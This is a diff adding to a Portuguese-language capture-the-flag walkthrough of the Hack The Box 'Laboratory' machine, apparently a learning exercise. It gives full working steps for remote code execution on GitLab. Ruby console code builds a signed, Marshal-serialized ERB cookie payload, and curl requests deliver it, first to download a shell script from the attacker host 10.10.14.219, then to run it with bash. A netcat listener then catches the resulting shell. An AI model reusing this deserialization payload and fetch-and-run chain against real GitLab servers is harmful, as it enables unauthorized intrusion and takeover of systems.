@@ -233,13 +233,66 @@ Editar o arquivo de configuração com a secret_key_base que obtemos do nosso al
 nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Após adicionarmos a secret_key_base ao nosso arquivo, vamos executar o console do rails.
+
+gitlab-rails console
+
+![Image](https://i.imgur.com/w77UbcU.png)
+
+Agora vamos usar o payload do H1 e fazer algumas mudanças, adicionamos o comando: 'curl -s 10.10.14.219:1/chu.sh -o /tmp/chu.sh && chmod 777 /tmp/chu.sh'
+Sendo assim, fazendo o download da nossa shell e salvando ela no diretório /tmp e adicionando permissão.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `curl -s 10.10.14.219:1/chu.sh -o /tmp/chu.sh && chmod 777 /tmp/chu.sh` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Após esse comando, teremos na saída dele um cookie:
+![Image](https://i.imgur.com/bq5al2V.png)
+
+Agora vamos envia-lo para nosso alvo
+![Image](https://i.imgur.com/UPPGHoE.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAYIjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgY3VybCAtcyAxMC4xMC4xNC4yMTk6MS9jaHUuc2ggLW8gL3RtcC9jaHUuc2ggJiYgY2htb2QgNzc3IC90bXAvY2h1LnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--f4d90880783a7e9690a1708f3b37c665adf38322"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
+Ao enviar a requisição, podemos perceber que nosso payload funcionou e ele fez o download de nosso arquivo:
+![Image](https://i.imgur.com/e8zztVj.png)
 
 
+Agora nos falta executar nosso arquivo, para isso faremos o mesmo passo a cima, enviaremos um cookie com o comando: 'bash /tmp/chu.sh'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
 
+erb = ERB.new("<%= `bash /tmp/chu.sh` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Com isso temos o cookie para ser enviado:
+![Image](https://i.imgur.com/em2dby2.png)
 
+Agora basta enviarmos o payload que ira executar nossa shell (/tmp/chu.sh)
+![image](https://i.imgur.com/Dsh53ne.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiUiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC90bXAvY2h1LnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--68cfa7b052d7fb23908e3bc99f75a3ee154e5d0a"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+E estamos dentro!
+![Image](https://i.imgur.com/eweizzM.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vvnlp 1337
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 to escrevendo guenta aew
 
